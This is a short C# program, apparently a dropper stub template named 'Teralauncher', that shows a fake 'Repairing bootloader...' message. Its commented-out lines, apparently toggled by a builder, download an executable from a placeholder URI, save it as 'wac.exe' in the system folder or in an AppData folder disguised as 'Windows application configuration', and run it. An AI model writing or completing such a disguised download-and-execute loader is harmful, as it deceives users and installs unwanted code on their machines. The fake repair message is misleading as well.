﻿using System;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Teralauncher
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Repairing bootloader...");
            WebClient wc = new WebClient();
            //*Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Windows application configuration");
            //+wc.DownloadFile("#uri", Environment.GetFolderPath(Environment.SpecialFolder.SystemX86) + "wac.exe");
            //*wc.DownloadFile("#uri", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Windows application configuration\\wac.exe");
            //+Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.SystemX86) + "wac.exe");
            //*Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Windows application configuration\\wac.exe");
            Thread.Sleep(1000);
        }
    }
}
